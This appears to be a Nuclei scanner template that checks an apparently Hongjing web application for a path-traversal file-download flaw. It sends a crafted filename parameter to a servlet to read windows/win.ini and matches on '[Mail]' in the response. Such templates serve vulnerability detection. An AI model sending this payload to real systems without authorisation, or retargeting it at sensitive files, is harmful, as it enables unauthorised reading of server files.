id: hongjing-filedownload-second

info:
  name: hongjing-filedownload-second
  severity: critical
  author: hongjing-filedownload-second
http:
  - raw:
      - |
        GET /servlet/DisplayCustomerReportExcelFile?filename=..%5c..%5cwindows%5cwin.ini HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - "status_code==200 && contains(body,'[Mail]')"